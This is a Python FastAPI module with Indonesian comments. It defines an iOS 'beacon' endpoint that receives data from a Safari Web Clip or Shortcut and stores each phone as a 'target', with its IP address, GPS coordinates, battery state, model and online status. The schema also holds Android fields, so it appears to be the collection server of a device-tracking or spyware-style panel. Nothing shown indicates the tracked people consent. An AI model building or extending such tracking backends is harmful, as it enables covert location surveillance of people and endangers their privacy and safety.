"""Beacon ringan untuk perangkat iOS (Web Clip / Shortcut)."""
from __future__ import annotations

import time
import uuid
from typing import Any

from fastapi import APIRouter, Request

from . import db, security

router = APIRouter(prefix="/api/ios")


@router.post("/beacon")
async def beacon(request: Request) -> dict:
    """Terima data dari Safari/Shortcut di iPhone."""
    try:
        body: dict[str, Any] = await request.json()
    except (ValueError, TypeError):
        body = {}

    ip = security.client_ip(request)
    model = str(body.get("model") or "iPhone")
    token = str(body.get("id") or "").strip() or f"ios-{uuid.uuid4().hex[:10]}"
    now = time.time()

    row = db.one("SELECT id FROM targets WHERE token=?", (token,))
    if row is None:
        tid = uuid.uuid4().hex[:10]
        db.x(
            "INSERT INTO targets(id,token,label,brand,model,android,sdk,ip,isp,country,city,"
            "lat,lon,battery,charging,storage_free,first_seen,last_seen)"
            " VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
            (tid, token, model, "Apple", model, str(body.get("os") or "iOS"), 0,
             ip, "", "", "", body.get("lat"), body.get("lon"),
             int(body.get("battery") or 0), 1 if body.get("charging") else 0, 0, now, now),
        )
        db.audit("ios_baru", f"{tid} :: {model} :: {ip}")
    else:
        tid = row["id"]
        db.x(
            "UPDATE targets SET ip=?,lat=COALESCE(?,lat),lon=COALESCE(?,lon),"
            "battery=?,last_seen=?,online=1 WHERE id=?",
            (ip, body.get("lat"), body.get("lon"), int(body.get("battery") or 0), now, tid),
        )

    return {"ok": True, "id": tid, "token": token, "ts": now}
